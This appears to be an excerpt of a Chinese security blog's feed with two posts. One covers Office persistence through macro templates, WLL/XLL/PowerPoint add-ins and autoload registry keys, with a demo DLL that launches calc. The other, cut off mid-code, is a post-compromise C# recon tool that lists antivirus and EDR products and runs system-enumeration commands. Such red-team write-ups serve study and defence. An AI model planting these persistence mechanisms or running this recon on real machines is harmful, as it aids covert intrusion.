    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第一次说明。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间有过个需求，判断 <code>Office</code>是否开启宏，索性将 <a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a> 中有关 <code>Office</code> 的记录也在后文写一下。</p><ul><li>判断是否安装了 <code>Microsoft Office</code></li><li>判断是否开启了 <code>宏</code></li><li>相关利用</li></ul><h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows <span class="number">7</span> Ultimate x64</span><br><span class="line">- Office <span class="number">2007</span>（实际环境）</span><br><span class="line">- Office <span class="number">2010</span>（测试环境）</span><br><span class="line">- Office <span class="number">2013</span>（测试环境）</span><br><span class="line">- Office <span class="number">2016</span>（测试环境）</span><br></pre></td></tr></table></figure><h2 id="0x02-相关判断"><a href="#0x02-相关判断" class="headerlink" title="0x02 相关判断"></a>0x02 相关判断</h2><ul><li><p><code>VBAWarnings</code> 键值数值数据说明</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">1:启用所有宏</span></span><br><span class="line"><span class="section">2:禁用所有宏并发出通知</span></span><br><span class="line"><span class="section">3:禁用无数字部署的所有宏</span></span><br><span class="line"><span class="section">4:禁用所有宏并且不通知</span></span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过注册表检测 Office 是否开启宏</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">OfficeVBAWarnings</span>(<span class="params"><span class="keyword">string</span> OfficeVersion</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; OfficeFeatures = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"Excel"</span>, <span class="string">"Word"</span>, <span class="string">"PowerPoint"</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> Features <span class="keyword">in</span> OfficeFeatures)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> basekey = <span class="string">@"SOFTWARE\Microsoft\Office\"</span> + OfficeVersion + <span class="string">@"\"</span> + Features + <span class="string">@"\Security"</span>;</span><br><span class="line">                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">                <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span>[] ValueNames = registryKey.GetValueNames();</span><br><span class="line">                    <span class="keyword">if</span> (registryKey.ValueCount == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"  [&gt;] &#123;0&#125; VBAWarnings: 2"</span>, Features);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="keyword">string</span> KeyName <span class="keyword">in</span> ValueNames)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">object</span> VBAWarnings = registryKey.GetValue(<span class="string">"VBAWarnings"</span>);</span><br><span class="line">                            Console.WriteLine(<span class="string">"  [&gt;] &#123;0&#125; VBAWarnings: &#123;1&#125;"</span>, Features, VBAWarnings);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过注册表检测 Office 版本</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">OfficeIsInstall</span>(<span class="params"><span class="keyword">string</span> OfficeVersion</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> basekey = <span class="string">@"SOFTWARE\Microsoft\Office\"</span> + OfficeVersion + <span class="string">@"\Common\InstallRoot"</span>;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (registryKey.GetValue(<span class="string">"Path"</span>) != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"  [&gt;] Microsoft Office Version: &#123;0&#125;"</span>, OfficeVersion);</span><br><span class="line">                    OfficeVBAWarnings(OfficeVersion);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; OfficeVersions = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"8.0"</span>, <span class="string">"9.0"</span>, <span class="string">"10.0"</span>, <span class="string">"11.0"</span>, <span class="string">"12.0"</span>, <span class="string">"14.0"</span>, <span class="string">"15.0"</span>, <span class="string">"16.0"</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> OfficeVersion <span class="keyword">in</span> OfficeVersions)</span><br><span class="line">            &#123;</span><br><span class="line">                OfficeIsInstall(OfficeVersion);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-Office-模板宏"><a href="#0x03-Office-模板宏" class="headerlink" title="0x03 Office 模板宏"></a>0x03 Office 模板宏</h2><p>每次 <code>Office</code> 程序启动时都会加载使用 <code>Office</code> 程序中的基本模板。</p><p><em>相关位置</em></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Word Normal.dotm位置：</span><br><span class="line">C:<span class="symbol">\U</span>sers(username)<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>emplates<span class="symbol">\N</span>ormal.dotm</span><br><span class="line"></span><br><span class="line">Excel Personal.xlsb位置：C:<span class="symbol">\U</span>sers(username)<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>xcel<span class="symbol">\X</span>LSTART<span class="symbol">\P</span>ERSONAL.XLSB</span><br></pre></td></tr></table></figure><p><em>这一部分在倾旋的博客有提到</em></p><p>新建宏名字 –&gt; <code>word</code> 为<em>AutoOpen</em>， <code>Excel</code> 为<em>Auto_Open</em></p><p>使用 <code>GIF</code> 进行演示（Excel 同理）</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-27_22-32-49.gif" alt="Blog_2019-05-27_22-32-49.png"></p><p>本地使用相对应的 <code>Office</code> 版本生成的全局宏，替换目标机器对应的 <code>Office</code> 版本的全局宏，可行。</p><h2 id="0x04-Office-加载项"><a href="#0x04-Office-加载项" class="headerlink" title="0x04 Office  加载项"></a>0x04 Office  加载项</h2><p><code>Office</code> 中支持不同类型的加载项，从本质上来讲，<code>Office</code> 套装有很多受信任的位置，当放置库文件时，在打开 <code>Office</code> 程序时，会自动加载库文件。在 <code>Office</code> 的信任中心选择禁用加载项，实际上不会禁用WLL，也不会阻止VBA代码执行。</p><h3 id="1）Word-的-WLL-加载项"><a href="#1）Word-的-WLL-加载项" class="headerlink" title="1）Word 的 WLL 加载项"></a>1）Word 的 WLL 加载项</h3><p><code>Word</code> 的三个默认加载项位置如下所示：</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-27_22-32-49.png" alt="Blog_2019-05-27_22-32-49.png"></p><p>对用户位置中的 <code>Startup</code> 进一步调查发现，它是 Word 默认存放<code>全局模板</code>和<code>加载项</code>的文件夹，当启动Word时，程序会自动加载 <code>Startup</code> 文件夹中所有<code>*.dot、*.dotx或*.dotm</code>格式的Word文件，也可以托管拓展名为 <code>* .wll</code> 的文件。而<code>* .wll</code> 文件本质上是一个带有额外<code>特定于Office的扩展的DLL</code>。这意味着<code>* .wll</code> 文件起码可以实现基本的 <code>DLL 功能</code>，我们只需要将<code>*.dll</code> 重命名为 <code>*.wll</code>，放入此文件夹中，可获取当前<code>启动 word 的用户</code>的执行权限。</p><p><em>示例</em>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"calc"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">Run();</span><br><span class="line"><span class="comment">// MessageBox(NULL, L"Hello World，I'm RcoIl", L"demo", MB_OK);</span></span><br><span class="line"><span class="comment">// WinExec("calc.exe", SW_SHOWNORMAL);</span></span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这步骤出现了无法加载 <code>wll</code> 问题，所以我直接提问 <a href="https://www.twitter.com/domchell" target="_blank" rel="noopener">Dominic Chell.</a>，他给我的回答是：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在测试的时候也遇到了这样的问题，我认为它是使用了 UI 来弹出东西的，所以建议使用一个简单的 MessageBox 进行测试。并且确保是从 <span class="built_in">attach</span> 当中调用 Run()。</span><br><span class="line"></span><br><span class="line">在使用 MessageBox 时，确保没有使用任何有关系统的东西（避免缺失 DLL），并尝试所有的<span class="built_in">switch</span> cases</span><br></pre></td></tr></table></figure><p>exp 思路就不说了。</p><p>所以我最后使用了上面代码注释行。成功，结果如下。</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-27_22-32-50.gif" alt="Blog_2019-05-27_22-32-50.gif"></p><h3 id="2）Excel-的-XLL-加载项"><a href="#2）Excel-的-XLL-加载项" class="headerlink" title="2）Excel 的 XLL 加载项"></a>2）Excel 的 XLL 加载项</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>2.0<span class="symbol">\E</span>xcel<span class="symbol">\O</span>ptions注册表项中添加一个键值</span><br><span class="line">OPEN /R DemoAddin.xll （字符串值）</span><br></pre></td></tr></table></figure><p><code>Excel</code> 启动时，会自动检索 <code>C:\Users(username)\AppData\Roaming\Microsoft\AddIns</code>目录，所以不需要写入绝对路径，默认自动加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// DemoAddin.xll EXPORTS is xlAutoOpen</span><br></pre></td></tr></table></figure><h3 id="3）PowerPoint-的-VBA-加载项"><a href="#3）PowerPoint-的-VBA-加载项" class="headerlink" title="3）PowerPoint 的 VBA 加载项"></a>3）PowerPoint 的 VBA 加载项</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>2.0<span class="symbol">\P</span>owerPoint<span class="symbol">\A</span>ddIns<span class="symbol">\&lt;</span>AddInName&gt;</span><br></pre></td></tr></table></figure><p>文件格式为 <code>*.ppam</code> 或 <code>*.ppa</code>，也是与Excel 一样，放入<code>AddIns</code> 目录中。设置 <code>Autoload</code> 键值为 <strong>1</strong> ，更改PowerPoint 启动时自动加载加载项。</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-28_12-32-49.png" alt="Blog_2019-05-28_12-32-49"></p><p>关于<code>wll(DLL)</code> 、 <code>xll(dll)</code> 和 <code>ppam(VBA)</code> 的利用，可自行研究。</p><h3 id="4）更多"><a href="#4）更多" class="headerlink" title="4）更多"></a>4）更多</h3><p>更多内容请阅读文章底部的参考文章。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://attack.mitre.org/techniques/T1137/" target="_blank" rel="noopener">Office Application Startup</a><br><a href="https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/" target="_blank" rel="noopener">MAINTAINING ACCESS WITH NORMAL.DOTM</a><br><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener"><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener">Beyond good ol’ Run key, Part 62</a></a><br><a href="https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/" target="_blank" rel="noopener">Add-In Opportunities for Office Persistence</a><br><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 1 – Microsoft Office</a><br><a href="https://github.com/outflanknl/EvilClippy" target="_blank" rel="noopener">EvilClippy</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第一次说明。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>【编程】通过编程实现的本地机器信息收集</title>
    <link href="https://rcoil.me/2019/05/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91%E9%80%9A%E8%BF%87%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/05/【编程】通过编程实现的本地机器信息收集/</id>
    <published>2019-05-11T10:52:59.000Z</published>
    <updated>2019-10-31T16:09:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>可选用 <code>bat</code>、<code>C++</code>、<code>C#</code> 进行编写程序，前两者运行无条件限制，后者需要判断 <code>.NET</code> 版本，由于一直是对 <code>C#</code> 较感兴趣，所以使用后者进行编写，也可以直接使用 <code>execute-assembly</code> 执行。</p><p>本文多数模块取之文末的 <code>github</code> 项目，本项目地址 - <a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpGetBasisDown" target="_blank" rel="noopener">SharpGetBasisDown</a>。</p><h2 id="0x01-信息收集模块"><a href="#0x01-信息收集模块" class="headerlink" title="0x01 信息收集模块"></a>0x01 信息收集模块</h2><h3 id="1）安全产品检测"><a href="#1）安全产品检测" class="headerlink" title="1）安全产品检测"></a>1）安全产品检测</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">AV_EDR</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**- 获取进程信息</span></span><br><span class="line"><span class="comment">             * - 枚举杀软进程列表（自定义列表）</span></span><br><span class="line"><span class="comment">             * - 存在则输出</span></span><br><span class="line"><span class="comment">             * - 代码实现</span></span><br><span class="line"><span class="comment">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">           <span class="keyword">string</span>[] avproducts = &#123; <span class="string">"Skynet"</span>,...., <span class="string">"GDScan"</span> &#125;;</span><br><span class="line">            Process[] proces = Process.GetProcesses(Environment.MachineName);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Enumerating EDR products and Antivirus Processes on "</span> + Environment.MachineName + <span class="string">"..."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Loaded "</span> + avproducts.Length + <span class="string">" AV Process Names"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; proces.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; avproducts.Length; a++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> processSearch = avproducts[a];</span><br><span class="line">                    <span class="keyword">if</span> (proces[i].ProcessName.Equals(processSearch))</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"\t[!] Found AV Process: "</span> + proces[i].ProcessName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/**- 枚举列表（自定义列表）</span></span><br><span class="line"><span class="comment">             * - 使用 File.Exists 检测文件是否存在</span></span><br><span class="line"><span class="comment">             * - 存在则输出</span></span><br><span class="line"><span class="comment">             * - 代码实现</span></span><br><span class="line"><span class="comment">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="keyword">string</span>[] edrproducts = &#123; <span class="string">"CiscoAMPCEFWDriver.sys"</span>,...., <span class="string">"amm6460.sys"</span> &#125;;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Loaded "</span> + edrproducts.Length + <span class="string">" EDR Product Names"</span>);</span><br><span class="line">            <span class="keyword">string</span> edrPath = <span class="string">@"C:\Windows\System32\drivers\"</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e &lt; edrproducts.Length; e++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (File.Exists(edrPath + edrproducts[e]))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"\t[!] EDR driver found "</span> + edrproducts[e]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="2）计算机架构"><a href="#2）计算机架构" class="headerlink" title="2）计算机架构"></a>2）计算机架构</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Mains()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 直接使用 Environment</span></span><br><span class="line"><span class="comment">             * - 参考：https://docs.microsoft.com/en-us/dotnet/api/system.environment?view=netframework-4.8</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Environment members "</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前机器名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] MachineName: &#123;0&#125;"</span>, Environment.MachineName);</span><br><span class="line">            <span class="comment">// 当前用户名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] UserName: &#123;0&#125;"</span>, Environment.UserName);</span><br><span class="line">            <span class="comment">// 当前Domain名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] UserDomainName: &#123;0&#125;"</span>, Environment.UserDomainName);</span><br><span class="line">            <span class="comment">// 当前系统版本</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] OSVersion: &#123;0&#125;"</span>, Environment.OSVersion.ToString());</span><br><span class="line">            <span class="comment">// 当前目录</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] CurrentDirectory: &#123;0&#125;"</span>, Environment.CurrentDirectory);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 盘符</span></span><br><span class="line">            <span class="keyword">string</span>[] drives = Environment.GetLogicalDrives();</span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] GetLogicalDrives: &#123;0&#125;"</span>, <span class="keyword">String</span>.Join(<span class="string">", "</span>, drives));</span><br><span class="line">            <span class="comment">// 当前程序名</span></span><br><span class="line">            <span class="keyword">string</span>[] arguments = Environment.GetCommandLineArgs();</span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] GetCommandLineArgs: &#123;0&#125;"</span>, <span class="keyword">String</span>.Join(<span class="string">", "</span>, arguments));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="3-文件遍历"><a href="#3-文件遍历" class="headerlink" title="3) 文件遍历"></a>3) 文件遍历</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接利用bat执行就可以</span><br><span class="line"><span class="keyword">FOR</span> /F <span class="string">"Skip=1"</span> %<span class="built_in">%I</span> in ('wmic logicaldisk where <span class="string">"Size&lt;&gt;null"</span> get name') <span class="keyword">Do</span> (%<span class="built_in">%I</span> &amp;&amp; dir /<span class="keyword">s</span> /a %<span class="built_in">%I</span>)</span><br></pre></td></tr></table></figure><h3 id="4-执行命令获取相关"><a href="#4-执行命令获取相关" class="headerlink" title="4) 执行命令获取相关"></a>4) 执行命令获取相关</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 运行基础命令查询</span></span><br><span class="line">        public static void GetBasisInfo()</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 获取系统基础信息</span></span><br><span class="line"><span class="comment">            * - 管道没找到好的利用方式</span></span><br><span class="line"><span class="comment">            * - 直接加载系统库，使用 system,此方法有个缺点，需要预分配内存，部分命令无法运行</span></span><br><span class="line"><span class="comment">            * - 最后选择 ProcessStartInfo</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">string</span>[] commands = &#123;</span><br><span class="line">                <span class="string">"systeminfo"</span>,</span><br><span class="line">                <span class="string">"netstat -anop tcp"</span>,</span><br><span class="line">                <span class="string">"ipconfig /all"</span>,</span><br><span class="line">                <span class="string">"tasklist /v"</span>,</span><br><span class="line">                <span class="string">"set"</span>,</span><br><span class="line">                <span class="string">"query user"</span>,</span><br><span class="line">                <span class="string">"net share"</span>,</span><br><span class="line">                <span class="comment">// 自启动的程序</span></span><br><span class="line">                <span class="string">"wmic startup list full"</span>,</span><br><span class="line">                <span class="comment">// 查看分区</span></span><br><span class="line">                